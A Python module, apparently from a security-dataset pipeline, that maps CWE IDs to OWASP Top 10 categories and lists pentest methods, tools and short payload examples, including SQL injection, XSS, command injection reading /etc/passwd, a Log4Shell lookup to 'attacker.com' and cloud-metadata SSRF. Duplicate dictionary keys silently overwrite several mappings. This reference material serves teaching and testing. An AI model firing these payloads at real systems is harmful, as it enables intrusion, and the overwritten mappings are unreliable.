"""
owasp_mapper.py
---------------
Static OWASP mapping module — no crawling needed.
Provides:
  1. CWE → OWASP Top 10 (2021) category mapping  — 200+ CWEs covered
  2. OWASP category → pentesting methods, payload examples, detection signals

Used by build_dataset.py to enrich records with:
  owasp_category, attack_method, payload_example, detection_signals, tool_used, code_pattern
"""

# ── CWE → OWASP Top 10 (2021) ─────────────────────────────────────────────────
# Source: OWASP Top 10 2021 CWE mappings + MITRE CWE database
# https://owasp.org/Top10/

CWE_TO_OWASP = {

    # ── A01: Broken Access Control ─────────────────────────────────────────
    "CWE-22":   "A01:2021-Broken Access Control",   # Path Traversal
    "CWE-23":   "A01:2021-Broken Access Control",   # Relative Path Traversal
    "CWE-24":   "A01:2021-Broken Access Control",   # Path Traversal '../filedir'
    "CWE-36":   "A01:2021-Broken Access Control",   # Absolute Path Traversal
    "CWE-59":   "A01:2021-Broken Access Control",   # Link Following
    "CWE-200":  "A01:2021-Broken Access Control",   # Exposure of Sensitive Info
    "CWE-201":  "A01:2021-Broken Access Control",   # Sensitive Data in Sent Data
    "CWE-219":  "A01:2021-Broken Access Control",   # File with Sensitive Data Under Web Root
    "CWE-264":  "A01:2021-Broken Access Control",   # Permissions, Privileges, Access Control
    "CWE-275":  "A01:2021-Broken Access Control",   # Permission Issues
    "CWE-276":  "A01:2021-Broken Access Control",   # Incorrect Default Permissions
    "CWE-277":  "A01:2021-Broken Access Control",   # Insecure Inherited Permissions
    "CWE-278":  "A01:2021-Broken Access Control",   # Insecure Preserved Inherited Permissions
    "CWE-279":  "A01:2021-Broken Access Control",   # Incorrect Execution-Assigned Permissions
    "CWE-280":  "A01:2021-Broken Access Control",   # Improper Handling of Insufficient Permissions
    "CWE-281":  "A01:2021-Broken Access Control",   # Improper Preservation of Permissions
    "CWE-282":  "A01:2021-Broken Access Control",   # Improper Ownership Management
    "CWE-283":  "A01:2021-Broken Access Control",   # Unverified Ownership
    "CWE-284":  "A01:2021-Broken Access Control",   # Improper Access Control
    "CWE-285":  "A01:2021-Broken Access Control",   # Improper Authorization
    "CWE-286":  "A01:2021-Broken Access Control",   # Incorrect User Management
    "CWE-287":  "A01:2021-Broken Access Control",   # Improper Authentication (also A07)
    "CWE-288":  "A01:2021-Broken Access Control",   # Auth Bypass Using Alternate Path
    "CWE-290":  "A01:2021-Broken Access Control",   # Auth Bypass via Spoofing
    "CWE-425":  "A01:2021-Broken Access Control",   # Direct Request (Forced Browsing)
    "CWE-434":  "A01:2021-Broken Access Control",   # Unrestricted Upload of Dangerous File
    "CWE-436":  "A01:2021-Broken Access Control",   # Interpretation Conflict
    "CWE-552":  "A01:2021-Broken Access Control",   # Files Accessible to External Parties
    "CWE-566":  "A01:2021-Broken Access Control",   # Auth Bypass via Data from Untrusted Source
    "CWE-601":  "A01:2021-Broken Access Control",   # URL Redirection (Open Redirect)
    "CWE-639":  "A01:2021-Broken Access Control",   # Authorization Bypass via User-Controlled Key (IDOR)
    "CWE-651":  "A01:2021-Broken Access Control",   # Exposure of WSDL to Unauthorized Actors
    "CWE-668":  "A01:2021-Broken Access Control",   # Exposure of Resource to Wrong Sphere
    "CWE-706":  "A01:2021-Broken Access Control",   # Use of Incorrectly-Resolved Name
    "CWE-721":  "A01:2021-Broken Access Control",   # OWASP Top Ten 2007 - Broken Access
    "CWE-732":  "A01:2021-Broken Access Control",   # Incorrect Permission Assignment for Critical Resource
    "CWE-764":  "A01:2021-Broken Access Control",   # Multiple Locks of Critical Resource
    "CWE-862":  "A01:2021-Broken Access Control",   # Missing Authorization
    "CWE-863":  "A01:2021-Broken Access Control",   # Incorrect Authorization
    "CWE-913":  "A01:2021-Broken Access Control",   # Improper Control of Dynamically-Managed Code Resources

    # ── A02: Cryptographic Failures ───────────────────────────────────────
    "CWE-261":  "A02:2021-Cryptographic Failures",  # Weak Cryptography for Passwords
    "CWE-296":  "A02:2021-Cryptographic Failures",  # Improper Following of Certificate Chain of Trust
    "CWE-310":  "A02:2021-Cryptographic Failures",  # Cryptographic Issues
    "CWE-319":  "A02:2021-Cryptographic Failures",  # Cleartext Transmission of Sensitive Info
    "CWE-321":  "A02:2021-Cryptographic Failures",  # Use of Hard-coded Cryptographic Key
    "CWE-322":  "A02:2021-Cryptographic Failures",  # Key Exchange Without Authentication
    "CWE-323":  "A02:2021-Cryptographic Failures",  # Reusing Nonce / Key Pair in Encryption
    "CWE-324":  "A02:2021-Cryptographic Failures",  # Use of Key Past Expiration Date
    "CWE-325":  "A02:2021-Cryptographic Failures",  # Missing Required Cryptographic Step
    "CWE-326":  "A02:2021-Cryptographic Failures",  # Inadequate Encryption Strength
    "CWE-327":  "A02:2021-Cryptographic Failures",  # Use of Broken/Risky Cryptographic Algorithm
    "CWE-328":  "A02:2021-Cryptographic Failures",  # Use of Weak Hash
    "CWE-329":  "A02:2021-Cryptographic Failures",  # Generation of Predictable IV
    "CWE-330":  "A02:2021-Cryptographic Failures",  # Use of Insufficiently Random Values
    "CWE-331":  "A02:2021-Cryptographic Failures",  # Insufficient Entropy
    "CWE-332":  "A02:2021-Cryptographic Failures",  # Insufficient Entropy in PRNG
    "CWE-333":  "A02:2021-Cryptographic Failures",  # Improper Handling of Insufficient Entropy in TRNG
    "CWE-334":  "A02:2021-Cryptographic Failures",  # Small Space of Random Values
    "CWE-335":  "A02:2021-Cryptographic Failures",  # Incorrect Usage of Seeds in Pseudo-Random Number Generator
    "CWE-336":  "A02:2021-Cryptographic Failures",  # Same Seed in PRNG
    "CWE-337":  "A02:2021-Cryptographic Failures",  # Predictable Seed in Pseudo-Random Number Generator
    "CWE-338":  "A02:2021-Cryptographic Failures",  # Use of Cryptographically Weak PRNG
    "CWE-339":  "A02:2021-Cryptographic Failures",  # Small Seed Space in PRNG
    "CWE-340":  "A02:2021-Cryptographic Failures",  # Generation of Predictable Numbers or Identifiers
    "CWE-347":  "A02:2021-Cryptographic Failures",  # Improper Verification of Cryptographic Signature
    "CWE-522":  "A02:2021-Cryptographic Failures",  # Insufficiently Protected Credentials
    "CWE-523":  "A02:2021-Cryptographic Failures",  # Unprotected Transport of Credentials
    "CWE-720":  "A02:2021-Cryptographic Failures",  # OWASP Top Ten 2007 - Insecure Comm
    "CWE-757":  "A02:2021-Cryptographic Failures",  # Selection of Less-Secure Algorithm
    "CWE-759":  "A02:2021-Cryptographic Failures",  # Use of One-Way Hash Without Salt
    "CWE-760":  "A02:2021-Cryptographic Failures",  # Use of One-Way Hash with Predictable Salt
    "CWE-780":  "A02:2021-Cryptographic Failures",  # Use of RSA Without OAEP
    "CWE-818":  "A02:2021-Cryptographic Failures",  # Insufficient Transport Layer Protection
    "CWE-916":  "A02:2021-Cryptographic Failures",  # Use of Password Hash With Insufficient Effort
    "CWE-311":  "A02:2021-Cryptographic Failures",  # Missing Encryption of Sensitive Data
    "CWE-312":  "A02:2021-Cryptographic Failures",  # Cleartext Storage of Sensitive Info
    "CWE-313":  "A02:2021-Cryptographic Failures",  # Cleartext Storage in File or on Disk
    "CWE-314":  "A02:2021-Cryptographic Failures",  # Cleartext Storage in Heap
    "CWE-315":  "A02:2021-Cryptographic Failures",  # Cleartext Storage of Sensitive Info in Cookie
    "CWE-316":  "A02:2021-Cryptographic Failures",  # Cleartext Storage of Sensitive Info in Memory
    "CWE-317":  "A02:2021-Cryptographic Failures",  # Cleartext Storage of Sensitive Info in GUI
    "CWE-318":  "A02:2021-Cryptographic Failures",  # Cleartext Storage of Sensitive Info in Executable
    "CWE-259":  "A02:2021-Cryptographic Failures",  # Use of Hard-coded Password

    # ── A03: Injection ────────────────────────────────────────────────────
    "CWE-20":   "A03:2021-Injection",               # Improper Input Validation
    "CWE-74":   "A03:2021-Injection",               # Improper Neutralization (Injection)
    "CWE-75":   "A03:2021-Injection",               # Failure to Sanitize Special Elements
    "CWE-76":   "A03:2021-Injection",               # Improper Neutralization of Equivalent Special Elements
    "CWE-77":   "A03:2021-Injection",               # Command Injection
    "CWE-78":   "A03:2021-Injection",               # OS Command Injection
    "CWE-79":   "A03:2021-Injection",               # XSS - Cross-Site Scripting
    "CWE-80":   "A03:2021-Injection",               # Improper Neutralization of Script in HTML
    "CWE-81":   "A03:2021-Injection",               # Improper Neutralization of Script in Error Message
    "CWE-82":   "A03:2021-Injection",               # XSS via img src
    "CWE-83":   "A03:2021-Injection",               # XSS in URI Attribute
    "CWE-84":   "A03:2021-Injection",               # XSS via Encoded URI Schemes
    "CWE-85":   "A03:2021-Injection",               # Doubled Character XSS
    "CWE-86":   "A03:2021-Injection",               # Improper Neutralization of Invalid Characters in Identifiers
    "CWE-87":   "A03:2021-Injection",               # Improper Neutralization of Alternate XSS Syntax
    "CWE-88":   "A03:2021-Injection",               # Argument Injection
    "CWE-89":   "A03:2021-Injection",               # SQL Injection
    "CWE-90":   "A03:2021-Injection",               # LDAP Injection
    "CWE-91":   "A03:2021-Injection",               # XML Injection
    "CWE-93":   "A03:2021-Injection",               # CRLF Injection
    "CWE-94":   "A03:2021-Injection",               # Code Injection
    "CWE-95":   "A03:2021-Injection",               # Eval Injection
    "CWE-96":   "A03:2021-Injection",               # Static Code Injection
    "CWE-97":   "A03:2021-Injection",               # Improper Neutralization of Server-Side Includes
    "CWE-98":   "A03:2021-Injection",               # PHP Remote File Inclusion
    "CWE-99":   "A03:2021-Injection",               # Resource Injection
    "CWE-100":  "A03:2021-Injection",               # Technology-Specific Injection
    "CWE-113":  "A03:2021-Injection",               # HTTP Response Splitting
    "CWE-116":  "A03:2021-Injection",               # Improper Encoding or Escaping
    "CWE-138":  "A03:2021-Injection",               # Improper Neutralization of Special Elements
    "CWE-184":  "A03:2021-Injection",               # Incomplete Denylist
    "CWE-470":  "A03:2021-Injection",               # Unsafe Reflection
    "CWE-564":  "A03:2021-Injection",               # SQL Injection: Hibernate
    "CWE-643":  "A03:2021-Injection",               # XPath Injection
    "CWE-652":  "A03:2021-Injection",               # XQuery Injection
    "CWE-917":  "A03:2021-Injection",               # Expression Language Injection
    "CWE-943":  "A03:2021-Injection",               # Improper Neutralization of Special Elements in Data Query Logic
    "CWE-1236": "A03:2021-Injection",               # Improper Neutralization of Formula in CSV

    # ── A04: Insecure Design ──────────────────────────────────────────────
    "CWE-73":   "A04:2021-Insecure Design",         # External Control of File Name or Path
    "CWE-183":  "A04:2021-Insecure Design",         # Permissive Allowlist
    "CWE-209":  "A04:2021-Insecure Design",         # Info Exposure Through Error Messages
    "CWE-213":  "A04:2021-Insecure Design",         # Exposure of Sensitive Information Due to Incompatible Policies
    "CWE-235":  "A04:2021-Insecure Design",         # Improper Handling of Extra Parameters
    "CWE-256":  "A04:2021-Insecure Design",         # Plaintext Storage of Password
    "CWE-257":  "A04:2021-Insecure Design",         # Storing Passwords in Recoverable Format
    "CWE-266":  "A04:2021-Insecure Design",         # Incorrect Privilege Assignment
    "CWE-269":  "A04:2021-Insecure Design",         # Improper Privilege Management
    "CWE-280":  "A04:2021-Insecure Design",         # Improper Handling of Insufficient Permissions
    "CWE-285":  "A04:2021-Insecure Design",         # Improper Authorization
    "CWE-301":  "A04:2021-Insecure Design",         # Reflection Attack in Authentication Protocol
    "CWE-302":  "A04:2021-Insecure Design",         # Auth Bypass via Assumed-Immutable Data
    "CWE-304":  "A04:2021-Insecure Design",         # Missing Critical Step in Authentication
    "CWE-306":  "A04:2021-Insecure Design",         # Missing Authentication for Critical Function
    "CWE-307":  "A04:2021-Insecure Design",         # Improper Restriction of Excessive Auth Attempts
    "CWE-408":  "A04:2021-Insecure Design",         # Incorrect Behavior Order — Early Amplification
    "CWE-419":  "A04:2021-Insecure Design",         # Unprotected Primary Channel
    "CWE-430":  "A04:2021-Insecure Design",         # Deployment of Wrong Handler
    "CWE-434":  "A04:2021-Insecure Design",         # Unrestricted Upload of Dangerous File Type
    "CWE-444":  "A04:2021-Insecure Design",         # HTTP Request Smuggling
    "CWE-451":  "A04:2021-Insecure Design",         # UI Misrepresentation of Critical Info
    "CWE-472":  "A04:2021-Insecure Design",         # External Control of Assumed-Immutable Web Parameter
    "CWE-501":  "A04:2021-Insecure Design",         # Trust Boundary Violation
    "CWE-522":  "A04:2021-Insecure Design",         # Insufficiently Protected Credentials
    "CWE-525":  "A04:2021-Insecure Design",         # Use of Web Browser Cache Containing Sensitive Info
    "CWE-539":  "A04:2021-Insecure Design",         # Use of Persistent Cookies with Sensitive Info
    "CWE-579":  "A04:2021-Insecure Design",         # J2EE Bad Practices: Non-serializable Object Stored in Session
    "CWE-598":  "A04:2021-Insecure Design",         # Info Exposure Through Query Strings in GET Request
    "CWE-602":  "A04:2021-Insecure Design",         # Client-Side Enforcement of Server-Side Security
    "CWE-642":  "A04:2021-Insecure Design",         # External Control of Critical State Data
    "CWE-646":  "A04:2021-Insecure Design",         # Reliance on File Name in Security Decision
    "CWE-650":  "A04:2021-Insecure Design",         # Trusting HTTP Permission Methods
    "CWE-653":  "A04:2021-Insecure Design",         # Insufficient Compartmentalization
    "CWE-656":  "A04:2021-Insecure Design",         # Reliance on Security Through Obscurity
    "CWE-657":  "A04:2021-Insecure Design",         # Violation of Secure Design Principles
    "CWE-799":  "A04:2021-Insecure Design",         # Improper Control of Interaction Frequency

    # ── A05: Security Misconfiguration ───────────────────────────────────
    "CWE-2":    "A05:2021-Security Misconfiguration",  # Environment
    "CWE-11":   "A05:2021-Security Misconfiguration",  # ASP.NET Misconfiguration: Creating Debug Binary
    "CWE-13":   "A05:2021-Security Misconfiguration",  # ASP.NET Misconfiguration: Password in Config File
    "CWE-15":   "A05:2021-Security Misconfiguration",  # External Control of System/Config Setting
    "CWE-16":   "A05:2021-Security Misconfiguration",  # Configuration
    "CWE-260":  "A05:2021-Security Misconfiguration",  # Password in Config File
    "CWE-315":  "A05:2021-Security Misconfiguration",  # Cleartext Storage in Cookie
    "CWE-520":  "A05:2021-Security Misconfiguration",  # .NET Misconfiguration: Use of Impersonation
    "CWE-526":  "A05:2021-Security Misconfiguration",  # Exposure of Sensitive Information Through Environmental Variables
    "CWE-537":  "A05:2021-Security Misconfiguration",  # Java Runtime Error — Info Disclosure
    "CWE-541":  "A05:2021-Security Misconfiguration",  # Inclusion of Sensitive Info in Include File
    "CWE-548":  "A05:2021-Security Misconfiguration",  # Exposure of Information Through Directory Listing
    "CWE-554":  "A05:2021-Security Misconfiguration",  # ASP.NET Misconfiguration: Not Using Input Validation Framework
    "CWE-555":  "A05:2021-Security Misconfiguration",  # J2EE Misconfiguration: Plaintext Password in Config File
    "CWE-560":  "A05:2021-Security Misconfiguration",  # Use of umask() with chmod-style Argument
    "CWE-570":  "A05:2021-Security Misconfiguration",  # Expression is Always False
    "CWE-571":  "A05:2021-Security Misconfiguration",  # Expression is Always True
    "CWE-579":  "A05:2021-Security Misconfiguration",  # J2EE Bad Practices: Non-serializable Object
    "CWE-611":  "A05:2021-Security Misconfiguration",  # XXE — Improper Restriction of XML External Entity
    "CWE-614":  "A05:2021-Security Misconfiguration",  # Sensitive Cookie Without Secure Attribute
    "CWE-756":  "A05:2021-Security Misconfiguration",  # Missing Custom Error Page
    "CWE-776":  "A05:2021-Security Misconfiguration",  # XML Entity Expansion (Billion Laughs)
    "CWE-942":  "A05:2021-Security Misconfiguration",  # Overly Permissive CORS Policy
    "CWE-1004": "A05:2021-Security Misconfiguration",  # Sensitive Cookie Without HttpOnly Flag
    "CWE-1022": "A05:2021-Security Misconfiguration",  # Use of Web Link to Untrusted Target (target=_blank)

    # ── A06: Vulnerable and Outdated Components ───────────────────────────
    "CWE-937":  "A06:2021-Vulnerable and Outdated Components",  # OWASP Top Ten 2013 — Using Known Vulnerable Components
    "CWE-1035": "A06:2021-Vulnerable and Outdated Components",  # OWASP Top Ten 2017 — Using Known Vulnerable Components
    "CWE-1104": "A06:2021-Vulnerable and Outdated Components",  # Use of Unmaintained Third Party Components

    # ── A07: Identification and Authentication Failures ───────────────────
    "CWE-255":  "A07:2021-Identification and Authentication Failures",  # Credentials Management
    "CWE-259":  "A07:2021-Identification and Authentication Failures",  # Hard-coded Password
    "CWE-287":  "A07:2021-Identification and Authentication Failures",  # Improper Authentication
    "CWE-288":  "A07:2021-Identification and Authentication Failures",  # Auth Bypass Using Alternate Path
    "CWE-290":  "A07:2021-Identification and Authentication Failures",  # Auth Bypass via Spoofing
    "CWE-294":  "A07:2021-Identification and Authentication Failures",  # Auth Bypass by Capture-Replay
    "CWE-295":  "A07:2021-Identification and Authentication Failures",  # Improper Certificate Validation
    "CWE-297":  "A07:2021-Identification and Authentication Failures",  # Improper Validation of Cert with Host Mismatch
    "CWE-300":  "A07:2021-Identification and Authentication Failures",  # Channel Accessible by Non-Endpoint
    "CWE-302":  "A07:2021-Identification and Authentication Failures",  # Auth Bypass via Assumed-Immutable Data
    "CWE-303":  "A07:2021-Identification and Authentication Failures",  # Incorrect Implementation of Authentication Algorithm
    "CWE-304":  "A07:2021-Identification and Authentication Failures",  # Missing Critical Step in Authentication
    "CWE-305":  "A07:2021-Identification and Authentication Failures",  # Auth Bypass via Primary Channel
    "CWE-306":  "A07:2021-Identification and Authentication Failures",  # Missing Authentication for Critical Function
    "CWE-307":  "A07:2021-Identification and Authentication Failures",  # Improper Restriction of Excessive Auth Attempts
    "CWE-308":  "A07:2021-Identification and Authentication Failures",  # Use of Single-Factor Authentication
    "CWE-309":  "A07:2021-Identification and Authentication Failures",  # Use of Password System for Primary Authentication
    "CWE-340":  "A07:2021-Identification and Authentication Failures",  # Generation of Predictable Numbers
    "CWE-346":  "A07:2021-Identification and Authentication Failures",  # Origin Validation Error
    "CWE-384":  "A07:2021-Identification and Authentication Failures",  # Session Fixation
    "CWE-521":  "A07:2021-Identification and Authentication Failures",  # Weak Password Requirements
    "CWE-613":  "A07:2021-Identification and Authentication Failures",  # Insufficient Session Expiration
    "CWE-620":  "A07:2021-Identification and Authentication Failures",  # Unverified Password Change
    "CWE-640":  "A07:2021-Identification and Authentication Failures",  # Weak Password Recovery
    "CWE-798":  "A07:2021-Identification and Authentication Failures",  # Use of Hard-coded Credentials
    "CWE-940":  "A07:2021-Identification and Authentication Failures",  # Improper Verification of Source of Communication
    "CWE-1216": "A07:2021-Identification and Authentication Failures",  # Lockout Mechanism Errors

    # ── A08: Software and Data Integrity Failures ─────────────────────────
    "CWE-345":  "A08:2021-Software and Data Integrity Failures",  # Insufficient Verification of Data Authenticity
    "CWE-353":  "A08:2021-Software and Data Integrity Failures",  # Missing Support for Integrity Check
    "CWE-426":  "A08:2021-Software and Data Integrity Failures",  # Untrusted Search Path
    "CWE-494":  "A08:2021-Software and Data Integrity Failures",  # Download of Code Without Integrity Check
    "CWE-502":  "A08:2021-Software and Data Integrity Failures",  # Deserialization of Untrusted Data
    "CWE-565":  "A08:2021-Software and Data Integrity Failures",  # Reliance on Cookies Without Validation
    "CWE-784":  "A08:2021-Software and Data Integrity Failures",  # Reliance on Cookies Without Validation and Integrity
    "CWE-829":  "A08:2021-Software and Data Integrity Failures",  # Inclusion of Functionality from Untrusted Control Sphere
    "CWE-830":  "A08:2021-Software and Data Integrity Failures",  # Inclusion of Web Functionality from Untrusted Source
    "CWE-915":  "A08:2021-Software and Data Integrity Failures",  # Improperly Controlled Modification of Dynamically-Determined Object Attributes
    "CWE-116":  "A08:2021-Software and Data Integrity Failures",  # Improper Encoding or Escaping of Output

    # ── A09: Security Logging and Monitoring Failures ─────────────────────
    "CWE-117":  "A09:2021-Security Logging and Monitoring Failures",  # Improper Output Neutralization for Logs
    "CWE-223":  "A09:2021-Security Logging and Monitoring Failures",  # Omission of Security-Relevant Information
    "CWE-532":  "A09:2021-Security Logging and Monitoring Failures",  # Insertion of Sensitive Info into Log File
    "CWE-778":  "A09:2021-Security Logging and Monitoring Failures",  # Insufficient Logging

    # ── A10: Server-Side Request Forgery ──────────────────────────────────
    "CWE-918":  "A10:2021-Server-Side Request Forgery",  # SSRF
}


# ── OWASP category → pentest intelligence ─────────────────────────────────────
OWASP_PENTEST = {
    "A01:2021-Broken Access Control": {
        "attack_method":     "Manipulate URL parameters, JWT tokens, or IDOR references to access unauthorized resources",
        "payload_example":   "/api/users/1 → /api/users/2 (change numeric ID); ../../../etc/passwd (path traversal)",
        "detection_signals": [
            "missing authorization checks on endpoints",
            "predictable / sequential resource identifiers",
            "no role-based access enforcement",
            "direct object reference without ownership validation",
            "path traversal sequences not stripped from input",
            "forced browsing to admin/internal pages possible"
        ],
        "tool_used":     "Burp Suite, OWASP ZAP, ffuf",
        "code_pattern":  "GET /resource/{id} with no ownership check; open() with user-supplied path"
    },
    "A02:2021-Cryptographic Failures": {
        "attack_method":     "Intercept traffic or access stored data to exploit weak / missing encryption",
        "payload_example":   "Downgrade HTTPS to HTTP; crack MD5-hashed password offline with Hashcat",
        "detection_signals": [
            "HTTP instead of HTTPS for sensitive data",
            "MD5 or SHA1 used for password hashing",
            "hard-coded encryption keys in source code",
            "sensitive data stored in cleartext in database",
            "weak TLS versions (TLS 1.0 / 1.1) still accepted",
            "no salt used in password hashing"
        ],
        "tool_used":     "Wireshark, Hashcat, SSLyze, testssl.sh",
        "code_pattern":  "hashlib.md5(password.encode()).hexdigest(); store(password=plaintext)"
    },
    "A03:2021-Injection": {
        "attack_method":     "Inject malicious payloads into user-controlled input to manipulate query or command execution",
        "payload_example":   "' OR 1=1 --  |  <script>alert(1)</script>  |  ; cat /etc/passwd  |  ${7*7}",
        "detection_signals": [
            "user input concatenated directly into SQL / OS command",
            "no prepared statements or parameterized queries",
            "dynamic query construction visible in code",
            "unsanitized template rendering",
            "eval() or exec() called with user input",
            "LDAP / XPath queries built from user input"
        ],
        "tool_used":     "sqlmap, XSStrike, commix, Burp Suite",
        "code_pattern":  "query = 'SELECT * FROM users WHERE id=' + user_input; os.system(cmd + user_input)"
    },
    "A04:2021-Insecure Design": {
        "attack_method":     "Exploit missing security controls baked into architecture — no rate limiting, no anti-automation, verbose errors",
        "payload_example":   "Brute-force OTP with no rate limit; enumerate accounts via distinct error messages",
        "detection_signals": [
            "no rate limiting on sensitive endpoints",
            "verbose error messages leaking stack traces or internal paths",
            "password recovery reveals original password",
            "no CAPTCHA / anti-automation on public forms",
            "security design review artifacts absent"
        ],
        "tool_used":     "Burp Intruder, custom scripts, ffuf",
        "code_pattern":  "No rate-limit middleware on /api/login; except Exception as e: return str(e)"
    },
    "A05:2021-Security Misconfiguration": {
        "attack_method":     "Access default credentials, exposed admin panels, directory listings, or misconfigured cloud storage",
        "payload_example":   "admin:admin login; GET /admin (no auth); s3://bucket/config.env public read",
        "detection_signals": [
            "default credentials unchanged on admin panels",
            "DEBUG=True in production",
            "directory listing enabled on web server",
            "unnecessary services / ports exposed",
            "S3 bucket or blob storage publicly readable",
            "XXE not disabled in XML parser",
            "CORS set to wildcard (*)"
        ],
        "tool_used":     "Nikto, Nmap, ScoutSuite, Trivy, OWASP ZAP",
        "code_pattern":  "DEBUG=True in settings.py; cors_allow_all_origins = True"
    },
    "A06:2021-Vulnerable and Outdated Components": {
        "attack_method":     "Identify outdated libraries with known CVEs and exploit published PoC exploits",
        "payload_example":   "Log4Shell: ${jndi:ldap://attacker.com/a} in User-Agent; exploit Apache Struts via Content-Type header",
        "detection_signals": [
            "outdated versions in requirements.txt / package.json / pom.xml",
            "components with published CVEs in use",
            "no automated dependency scanning in CI/CD",
            "transitive / indirect dependencies not audited"
        ],
        "tool_used":     "OWASP Dependency-Check, Trivy, Snyk, Dependabot",
        "code_pattern":  "log4j-core:2.14.1 in pom.xml; django==2.2.0 in requirements.txt"
    },
    "A07:2021-Identification and Authentication Failures": {
        "attack_method":     "Brute-force credentials, exploit weak session tokens, session fixation, or bypass MFA",
        "payload_example":   "admin:password123; predict session token from user_id+timestamp; reuse token after logout",
        "detection_signals": [
            "no account lockout after failed login attempts",
            "weak or predictable session IDs",
            "passwords not hashed with bcrypt / argon2 / scrypt",
            "no MFA for privileged accounts",
            "session not invalidated after logout",
            "hard-coded credentials in source code"
        ],
        "tool_used":     "Hydra, Medusa, Burp Suite, jwt_tool",
        "code_pattern":  "session_id = str(user_id) + str(int(time.time())); if password == stored_password:"
    },
    "A08:2021-Software and Data Integrity Failures": {
        "attack_method":     "Supply chain attack via malicious package, tampered CI/CD pipeline, or unsafe deserialization",
        "payload_example":   "npm install malicious-pkg (typosquatting); pickle.loads(user_data) RCE; unsigned update via MITM",
        "detection_signals": [
            "no integrity checks (SRI hashes) on third-party scripts",
            "unsafe deserialization of user-supplied data",
            "unsigned software update mechanism",
            "CI/CD pipeline uses unversioned / unverified actions",
            "no SBOM (Software Bill of Materials)"
        ],
        "tool_used":     "Socket.dev, Snyk, Sigstore, Semgrep",
        "code_pattern":  "pickle.loads(user_supplied_data); yaml.load(data) without Loader"
    },
    "A09:2021-Security Logging and Monitoring Failures": {
        "attack_method":     "Operate undetected by exploiting absence of logging, alerting, or monitoring",
        "payload_example":   "Repeated failed logins trigger no alert; SQLi attempts not logged; log injection via CRLF",
        "detection_signals": [
            "authentication events not logged",
            "no centralized logging or SIEM",
            "no alerting on suspicious patterns",
            "logs contain sensitive data (passwords, tokens)",
            "log injection possible via user-controlled input in log statements"
        ],
        "tool_used":     "Manual audit, log review, Splunk, ELK",
        "code_pattern":  "except Exception: pass  # silent failure; logger.info('Login: ' + username)"
    },
    "A10:2021-Server-Side Request Forgery": {
        "attack_method":     "Make the server issue requests to internal / cloud metadata services using attacker-controlled URL input",
        "payload_example":   "url=http://169.254.169.254/latest/meta-data/ (AWS); url=http://localhost:8080/admin",
        "detection_signals": [
            "user-controlled URL passed to server-side HTTP fetch",
            "no URL allowlist or blocklist validation",
            "cloud metadata endpoint reachable from app server",
            "internal service ports exposed to application layer",
            "DNS rebinding possible"
        ],
        "tool_used":     "Burp Suite, SSRFmap, Gopherus",
        "code_pattern":  "requests.get(user_supplied_url); urllib.urlopen(request.args.get('url'))"
    },
}


def get_owasp_category(cwe_id: str) -> str:
    """Map a CWE ID string to its OWASP Top 10 (2021) category."""
    return CWE_TO_OWASP.get(cwe_id, "Unknown")


def get_pentest_intel(owasp_category: str) -> dict:
    """Return pentesting intelligence dict for a given OWASP category."""
    return OWASP_PENTEST.get(owasp_category, {
        "attack_method":     "Manual testing required — no automated mapping available",
        "payload_example":   "",
        "detection_signals": [],
        "tool_used":         "Manual review",
        "code_pattern":      ""
    })


# ── Quick stats on load ────────────────────────────────────────────────────────
if __name__ == "__main__":
    from collections import Counter
    counts = Counter(CWE_TO_OWASP.values())
    print(f"Total CWEs mapped: {len(CWE_TO_OWASP)}\n")
    for cat, n in sorted(counts.items(), key=lambda x: -x[1]):
        short = cat.split("-", 1)[1] if "-" in cat else cat
        print(f"  {n:>3}  {short}")